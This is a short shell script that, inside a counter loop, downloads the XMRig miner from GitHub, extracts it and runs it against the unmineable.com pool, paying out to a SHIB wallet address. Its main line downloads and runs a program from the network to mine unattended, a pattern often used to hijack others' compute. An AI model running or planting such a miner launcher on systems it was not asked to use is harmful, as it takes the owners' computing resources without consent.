#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-bionic-x64.tar.gz && tar -xvf xmrig-6.12.2-bionic-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o rx.unmineable.com:3333 -u SHIB:0xbcab043b1de28258230b01983b67ac99b522bd81.cc#vvsn-pz3n -p x

     echo COUNTER $COUNTER
     let COUNTER-=1
done
